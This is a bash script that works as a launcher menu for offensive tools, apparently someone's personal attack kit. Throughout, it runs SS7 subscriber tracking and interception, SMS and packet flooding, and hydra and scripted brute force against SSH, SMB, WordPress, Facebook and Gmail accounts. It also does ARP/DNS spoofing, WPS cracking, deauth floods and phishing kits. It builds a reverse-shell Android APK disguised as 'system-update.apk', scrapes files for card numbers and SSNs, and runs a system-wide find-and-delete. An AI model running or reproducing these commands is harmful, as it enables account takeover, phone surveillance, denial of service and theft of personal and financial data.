#!/bin/bash

WL='/usr/share/wordlists/rockyou.txt'
XT='/home/snuff/Desktop/MENU/MODULES/xterm -hold -e'
MDK4='/home/snuff/Desktop/MENU/MODULES/mdk4'
MOD_DIR='/home/snuff/Desktop/MENU/MODULES'
LOG_DIR='/home/snuff/Desktop/MENU/LOGS'
DNSMASQ='/home/snuff/Desktop/MENU/MODULES/dnsmasq'
WGETCLONE='wget --mirror -r --convert-links --page-requisites --adjust-extension --save-headers'
ASK_URL='URL=$(zenity --entry --text="ENTER URL")'
ASK_PORT='PORT=$(zenity --entry --text="port number")'
ASK_IP='IP=$(zenity --entry --text="enter ip")'
FASTBOOT='/home/snuff/Desktop/MENU/MODULES/android/platform-tools/fastboot'
FILE="zenity --entry --text='path to file'"
MONITOR_IFACE='ap0'
INTERNET_IFACE='wlan0'
INFO='zenity --text-info'
L='logsave -asv /home/snuff/Desktop/MENU/LOGS/'
JJ='java -jar'
ADB='/home/snuff/Desktop/MENU/MODULES/android/platform-tools/./adb'
#####################################################################################
####################################################################################################################
parse_user_options() {
    while [[ -n "$1" ]]; do
        case "$1" in
            --sudo-s)
            	shift
            	sudo -s
            	shift
            	;;
            --ss7)
            	shift
            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/mobility/ && java -jar MapMobility.jar client_config" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar STP.jar stp_config" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar server.jar stp_config" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar server.jar vlr_config" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar server.jar hlr_config" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar server.jar client_config" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/fraud/ && java -jar MTForwardSMSResp.jar" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/fraud/ && java -jar SendIMSI.jar" &   	
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/AnyTimeInterrogation_Server/ && $JJ AnyTimeInterrogation.jar client_config" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/ProvideSubscriberInfo_Server/ && $JJ ProvideSubscriberInfo.jar" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/SendRoutingInfo_Server && $JJ SendRoutingInfo.jar" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/SendRoutingInfoForGPRS_Server && $JJ SendRoutingInfoForGPRS.jar" &
		$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/tracking/SendRoutingInfoForSM_Server && $JJ SendRoutingInfoForSM.jar" &			
            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/interception/ && java -jar UpdateLocation.jar" &
            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/diamater/ && java -jar dvdn.jar" & 
            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ && java -jar ss7_ddos.jar" & 
            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/sms/ && java -jar SMS.jar client_config" &
            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/ussd/ && java -jar ussd.jar client_config" &
            	$XT "cd /home/snuff/Desktop/MENU/MODULES/SS7/call_handling/ && java -jar MapCallhandling.jar client_config" &
            	shift
            	;;
            --ss7-edit-client-config)
            	shift
            	nano /home/snuff/Desktop/MENU/MODULES/SS7/client_config
            	shift
            	;;
            --ss7-edit-vlr)
            	shift
            	nano /home/snuff/Desktop/MENU/MODULES/SS7/vlr_config
           	shift
           	;;
            --ss7-edit-stp)
            	shift
            	nano /home/snuff/Desktop/MENU/MODULES/SS7/stp_config
            	shift
            	;;
            --ss7-edit-hlr)
            	shift
            	nano /home/snuff/Desktop/MENU/MODULES/SS7/hlr_config
            	shift
            	;;
            --clone-web)
                shift
                $ASK_URL; $WGETCLONE $URL; Photon --clone -u $URL
                shift
                ;;
            --scan-local)
                shift
                $XT "arp-scan --localnet" &
                $XT "netscanner" &
                $XT "wavemon" &
                shift
                ;; 
            --mac-lookup)
                shift
		MAC=$(zenity --entry --text="enter mac address to lookup")
                cat $MOD_DIR/oui.txt | grep $MAC  
                shift
                ;; 
            --tcp-kill)
                shift
                lsof -Pan -i tcp -i udp | $INFO
                lsof -i -P | grep -i "listen" | $INFO
                lsof -Pnl -i | $INFO
                lsof -Pni4 | grep LISTEN | column -t | $INFO
                $ASK_PORT; kill -9 | $INFO
                $(lsof -i :$PORT | awk '{l=$2} END {print l}') | $INFO
                shift
                ;; 
            --bypass-web)
                shift
                $ASK_URL; gobuster -u $URL -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
                shift
                ;; 
            --tcp-con)
                shift
                $ASK_IP; $ASK_PORT; citrix $IP $PORT
                shift
                ;;                                                                                    
            --md2html)
                shift
                NAME=$(zenity --entry --text="name the html file")
                MDFILE=$(zenity --entry --text="name the MD file")                
                markdown-it $MDFILE > $NAME.html
                shift
                ;;
            --file-search)
                shift
                OPT=$(zenity --entry --text="OPTIONS: findfile | findword | findext | replacetext | findefolders")
              	if [[ "$OPT" = "findword" ]]; then
              	WORD=$(zenity --entry --text="word to search for inside file")                
                grep -rli $WORD / | $INFO
              	fi  
              	if [[ "$OPT" = "findfile" ]]; then
              	FILE=$(zenity --entry --text="file to search for")                
                find / -name $FILE | $INFO
              	fi  
              	if [[ "$OPT" = "findext" ]]; then
              	EXTNAME=$(zenity --entry --text="ext to search for")                              	
                find / -type f -name *$EXTNAME | $INFO
              	fi  
              	if [[ "$OPT" = "replacetext" ]]; then
              	OLDTXT=$(zenity --entry --text="TXT TO REPLACE")  
              	NEWTXT=$(zenity --entry --text="NEW TXT TO REPLACE") 
              	FILE=$(zenity --entry --text="enter path to file")                	               	                            	              	
                sed -i "s/$OLDTXT/$NEWTXT/g" $FILE 
              	fi
              	if [[ "$OPT" = "findefolders" ]]; then
                find / -empty | $INFO
              	OPT=$(zenity --entry --text="DELETE EMPTY FOLDERS YES/NO")                	               	                            	              	
		if [[ "${OPT}" = "YES" ]] ; then
		find / -empty -delete
		elif [[ "${OPT}" = "NO" ]] ; then
		exit 0
		fi
              	fi            	              	              	              	              	              	           
                shift
                ;;                                                                                    
            --key-log)
                shift
                $ASK_IP
		xspy $IP
                shift
                ;;
            --extract-emails)
                shift
		FILE=$(zenity --entry --text="path to file")
		grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $FILE | $INFO
		grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" $FILE | $INFO
                shift
                ;; 
            --extract-ip)
                shift
		FILE=$(zenity --entry --text="path to file")
		grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" $FILE | $INFO
                shift
                ;; 
            --extract-pass)
                shift
		FILE=$(zenity --entry --text="path to file")
		grep -i "pwd\|passw" $FILE | $INFO            
                shift
                ;; 
            --extract-users)
                shift
		FILE=$(zenity --entry --text="path to file")
		grep -i "user\|invalid\|authentication\|login" $FILE | $INFO               
                shift
                ;; 
            --extract-urls)
                shift
		FILE=$(zenity --entry --text="path to file")
		grep http | grep -shoP 'http.*?[" >]' $FILE | $INFO
		grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' $FILE | $INFO            
                shift
                ;;                                                                                    
            --extract-cc)
                shift
		FILE=$(zenity --entry --text="path to file")
		grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" $FILE | $INFO #VISA
		grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" $FILE | $INFO #MASTERCARD
		grep -E -o "\b3[47][0-9]{13}\b" $FILE | $INFO #AE               
                shift
                ;;
            --extract-ss)
                shift
		FILE=$(zenity --entry --text="path to file")
		grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" $FILE          
                shift
                ;; 
            --extract-phone)
                shift
		FILE=$(zenity --entry --text="path to file")
		grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' $FILE
                shift
                ;; 
            --extract-hash)
                shift
		FILE=$(zenity --entry --text="path to file")
		# Extract hashes
		#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
		egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' $FILE | egrep -o '[a-fA-F0-9]{32}'
		#Extract valid MySQL-Old hashes
		grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" $FILE
		#Extract blowfish hashes
		grep -e '$2a\$\08\$(.){75}' $FILE
		#Extract Joomla hashes
		egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" $FILE
		#Extract VBulletin hashes
		egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" $FILE
		#Extraxt phpBB3-MD5
		egrep -o '$H$S{31}' $FILE
		#Extract Wordpress-MD5
		egrep -o '$P$S{31}' $FILE
		#Extract Drupal 7
		egrep -o '$S$S{52}' $FILE
		#Extract old Unix-md5
		egrep -o '$1$w{8}S{22}' $FILE
		#Extract md5-apr1
		egrep -o '$apr1$w{8}S{22}' $FILE
		#Extract sha512crypt, SHA512(Unix)
		egrep -o '$6$w{8}S{86}' $FILE               
                shift
                ;; 
            --ddos-halflife)
                shift
		$ASK_IP
	    	halflife $IP 80              
                shift
                ;; 
            --ddos-sms)
                shift
		NUM=$(zenity --entry --text="targ NUMBER:")
		cd $MOD_DIR/Impulse/ && python3 impulse.py --method SMS --time 20 --threads 15 --target +$NUM                
                shift
                ;;                                                                                    
            --ddos-t50)
                shift
		$ASK_IP
		for i in {1..100}; do t50 --protocol T50 $IP; done               
                shift
                ;;
            --ddos-hping3)
                shift
                IP=$(zenity --entry --text="targ IP:")
		hping3 -V -c 1000000 -d 120 -S -w 64 -p 80 --flood --rand-source $IP
                shift
                ;; 
            --brute-fb)
                shift
              	GMAIL=$(zenity --entry --text="enter gmail to brute force facebook:")
            	FACEBOOKID=$(zenity --entry --text="enter facebook id to brute force:")              
            	python3 $MOD_DIR/Brute_Force.py -f $FACEBOOKID -l $WL; 
            	perl $MOD_DIR/Facebooker.pl $GMAIL $WL
                shift
                ;; 
            --brute-twitter)
                shift
             	TWITTERID=$(zenity --entry --text="enter twitter id to brute force:")
            	python3 $MOD_DIR/Brute_Force.py -T $TWITTERID -l $WL               
                shift
                ;; 
            --brute-hotmail)
                shift
             	HMAIL=$(zenity --entry --text="enter hotmail to brute force:")
            	python3 $MOD_DIR/Brute_Force.py -t $HMAIL -l $WL              
                shift
                ;; 
            --brute-gmail)
                shift
 		GMAIL=$(zenity --entry --text="enter gmail to brute force:")
		python3 $MOD_DIR/Brute_Force.py --gmail $GMAIL -l $WL               
                shift
                ;;                                                                                    
            --create-pwlist)
                shift
		DOM=$(zenity --entry --text="enter domain to create password list from")
		read -p "enter path to html file to create dictionary:" HTML_FILE
		crunch 6 6 0123456789ABCDEF -o pass.txt
		cewl $DOM -m 6 -w $DOM.txt
		html2dic $HTML_FILE                
                shift
                ;;
            --brute-snmp)
                shift
 		read -p "enter targ ip" IP
		hydra -P $WL -v $IP snmp               
                shift
                ;; 
            --brute-ftp)
                shift
 		read -p "enter targ ip" IP
		hydra -t 1 -l admin -P $WL -vV $IP ftp               
                shift
                ;; 
            --brute-ssh)
                shift
		read -p "enter targ ip" IP
           	hydra -v -V -u -L $WL -P $WL -t 1 -u $IP ssh
          	hydra $IP -s 22 ssh -l ADMIN -P $WL                
                shift
                ;; 
            --brute-pop3)
                shift
		read -p "enter targ ip" IP
		hydra -l USERNAME -P $WL -f $IP pop3 -V                
                shift
                ;; 
            --brute-smtp)
                shift
 		read -p "enter targ ip" IP
		hydra -P $WL $IP smtp -V               
                shift
                ;;
            --brute-smb)
                shift
 		read -p "enter targ ip" IP
		hydra -t 1 -V -f -l administrator -P $WL $IP smb               
                shift
                ;; 
            --brute-wordpress)
                shift
		read -p "enter targ ip" IP
		hydra -l admin -P $WL $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'                
                shift
                ;; 
            --decode-base64)
                shift
 		read -p "paste base64 string:" DECODE
		python -m base64 -d <<< "$DECODE"               
                shift
                ;; 
            --encode-base64)
                shift
 		read -p "enter string to encode to base64:" STRING
		python -m base64 -e <<< "$STRING"               
                shift
                ;;                                                                                    
            --gen-cert)
                shift
		cd Desktop &
		read -p "enter domain to generate cert:" DOM
		( _fd="domain.key" ; _fd_out="domain.crt" ; _len="2048" ; _days="365" \
		openssl req -newkey rsa:${_len} -nodes \
		-keyout ${_fd} -x509 -days ${_days} -out ${_fd_out} )
		certbot certonly -d $DOM -d www.$DOM              
                shift
                ;;
            --bettercap)
                shift
                bettercap
                shift
                ;; 
            --beef)
                shift
 		service apache2 start; beef-xss               
                shift
                ;; 
            --arpspoof)
                shift
 		arp-scan --localnet
		read -p "targ ip?:" TARG_IP 
		read -p "ROUTER IP?:" ROUTER_IP
		$XT "arpspoof -i wlan0 -c both -t $TARG_IP -r $ROUTER_IP" &
	        $XT "dnsspoof -i wlan0 host $TARG_IP >> $LOG_DIR/sniffedurls.txt" &
		$XT "tcpdump host $TARG_IP -w $LOG_DIR/arp_tcpdump_capture.pcap" &
		$XT "ngrep -x -C -o $LOG_DIR/pcap-ngrep host $TARG_IP" &
		$XT 'ngrep wlan0 -d "www.domain.com" port 443' &
		$XT 'ngrep -d wlan0 -qt "HTTP" "tcp"' &
		$XT "tcpick wlan0 -c --separator"
		#$XT "dsniff -i wlan0 -c -m -w $LOG_DIR/dsniff" &
		#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 &
		#$XT "sslstrip -l 8080 -f lock.ico" &               
                shift
                ;; 
            --phish-gophish)
                shift
                gophish
                shift
                ;;
            --phish-socialphish)
                shift
		cd $MOD_DIR/SocialFish/ && python SocialFish.py                
                shift
                ;; 
            --create-apk)
                shift
 		read -p "enter listener ip your ip" IP
		msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=5555 R> system-update.apk 		
		msfconsole \
		use exploit/multi/handler \
		set PAYLOAD android/meterpreter/reverse_tcp \
		set LHOST $IP \
		set LPORT 5555 \
		set ExitOnSession false \
		exploit -j -z
		               
                shift
                ;; 
            --msf-listener)
                shift
         	msfvenom -l all
 		read -p "enter your ip to listen on, the listener port is 5555:" IP
		read -p "enter your payload name ex.. android/meterpreter/reverse_http :" PAYLOAD
		msfconsole \
		use exploit/multi/handler \
		set PAYLOAD $PAYLOAD \
		set LHOST $IP \
		set LPORT 5555 \
		set ExitOnSession false \
		exploit -j -z        
                shift
                ;; 
            --mitm-router)
                shift
                read -p "enter iface to create ap:" IFACE_TO_HOST_AP
                read -p "enter iface with internet:" IFACE_WITH_INTERNET
                read -p "set mac addr:" MAC
       		$MOD_DIR/virt_router -i $IFACE_TO_HOST_AP -o $IFACE_WITH_INTERNET --mac $MAC --log-dns --catch-dns     
                shift
                ;;
            --set-mac)
                shift
    		read -p "enter new mac" MAC
		ifconfig wlan0 down
		macchanger -m type $MAC wlan0
		ifconfig wlan0 up	            
                shift
                ;; 
            --random-mac)
                shift
                ifconfig wlan0 down; macchanger -r wlan0; ifconfig wlan0 up		     
                shift
                ;; 
            --ip-on)
                shift
                echo 1 > /proc/sys/net/ipv4/ip_forward		  
                shift
                ;;
            --ip-off)
                shift
            	echo 0 > /proc/sys/net/ipv4/ip_forward	    
                shift
                ;;
            --reject-ip)
                shift
        	read -p "enter ip to reject:" IP
	    	iptables -A INPUT -s $IP -j DENY
                shift
                ;; 
            --rnet)
                shift
              	service NetworkManager restart	    		  
                shift
                ;; 
            --http-server)
                shift
                python2 -m SimpleHTTPServer 8000	
                shift
                ;;
            --config-kernal)
                shift
                sysctl -a; mousepad /etc/sysctl.conf; sysctl -p /etc/sysctl.conf
                shift
                ;;
            --net-info)
                shift
                arp; ip route; ifconfig; iwconfig; curl ifconfig.me; ip maddr show; ip neigh
                nmcli -p -m multiline -f all con show
                ip addr	
                shift
                ;;
            --loopcmd)
                shift
                read -p "enter cmd to loop:" CMD
	     	for i in {1..100}; do $CMD; done	
                shift
                ;; 
            --scan-sys)
                shift
                $L -asv $LOG_DIR/SYSTEM_SCAN "/home/snuff/Desktop/MENU/MODULES/scansys"
                shift
                ;; 
            --start-mon)
                shift
               # ifconfig wlan0 down
               # iw reg set BO
               #iwconfig wlan0 txpower 30
                #iwconfig wlan0 mode monitor
		#macchanger --random wlan0
		#ifconfig wlan0 up
		#airmon-ng check kill
		iw phy0 interface add ap0 type monitor
		ifconfig ap0 up
#	airmon-ng start wlan0
		#iwconfig wlan0 mode monitor  	        	
		airodump-ng -g -e --band abg --showack -M -W -a -w $LOG_DIR/pcap $MONITOR_IFACE
                shift
                ;;
            --airodump-ng-chsel)
            	shift
            	wash -2 -5 -a -U -s -u -i $MONITOR_IFACE		
        	CH=$(zenity --entry --text="targ CH:")
                BSSID=$(zenity --entry --text="targ bssid:")        	        	
		airodump-ng -c $CH --bssid $BSSID -g -e --band abg -c --showack -M -W -a -w $LOG_DIR/pcap $MONITOR_IFACE
            	shift
            	;;
            --stop-mon)
                shift
                airmon-ng stop wlan0mon
                service networking restart
                service NetworkManager restart
                shift
                ;;
            --create-iface)
                shift
                iw phy0 interface add ap0 type monitor 
		modprobe mac80211_hwsim radios=2 
		iw phy0 interface add ap1 type __ap
		ifconfig -a
		iwconfig
                shift
                ;;
            --create-hotspot)
                shift
                read -p " enter ssid" SSID
		nmcli -s dev wifi hotspot con-name QuickHotspot ssid "$SSID"	
                shift
                ;; 
            --scan-wifi)
                shift
                (
		wash -2 -5 -a -U -s -u -i $MONITOR_IFACE &
                nmcli device wifi list &
		iw dev $MONITOR_IFACE scan &
		nmcli -f all dev wifi list &
		IWFO='iwlist wlan0' 
		$IWFO scanning &
		$IWFO frequency &
		$IWFO rate &
		$IWFO keys &
		$IWFO power &
		$IWFO txpower &
		$IWFO event &
		$IWFO auth &
		$IWFO wpakeys
		) > SCAN_RESULTS_WIFI.txt
                shift
                ;; 
            --wps-attack)
                shift
                BSSID=$(zenity --entry --text="targ bssid:")
        	CH=$(zenity --entry --text="targ CH:")
        	$XT "reaver -i $MONITOR_IFACE -b $BSSID -c $CH -b -f -N -L -d 2 -vvroot; bash" &
        	$XT "bully $MONITOR_IFACE -b $BSSID -c $CH -S -F -B -v 3; bash" &
	        $XT "reaver -i $MONITOR_IFACE -b $BSSID -c $CH -K 1 -N -vv; bash" & 
	        $XT "bully $MONITOR_IFACE -b $BSSID -d -v 3; bash" &
	        $XT "reaver -i $MONITOR_IFACE -b $BSSID -c $CH -f -N -g 1 -vv -p ''; bash" &  
                shift
                ;;
            --deauth)
                shift
                BSSID=$(zenity --entry --text="targ bssid:")
        	STATION=$(zenity --entry --text="targ station:")
	        $XT "aireplay-ng --deauth 1000 -a $BSSID $MONITOR_IFACE" &
	        $XT "aireplay-ng --deauth 1000 -a $BSSID -c $STATION $MONITOR_IFACE"	

                shift
                ;;
            --mdk4-a)
                shift
                BSSID=$(zenity --entry --text="targ bssid:")
      	  	$XT "$MDK4 $MONITOR_IFACE a -a $BSSID -s 555555" &
       	 	$XT "$MDK4 $MONITOR_IFACE a -i $BSSID -s 555555" 	
                shift
                ;; 
            --mdk4-b)
                shift
                $XT "$MDK4 $MONITOR_IFACE b"	
                shift
                ;; 
            --mdk4-d)
                shift
                $XT "$MDK4 $MONITOR_IFACE d -s 43344434"
                shift
                ;; 
            --mdk4-e)
                shift
                BSSID=$(zenity --entry --text="targ bssid:")
	        $XT "$MDK4 $MONITOR_IFACE e -t $BSSID -l"
                shift
                ;;
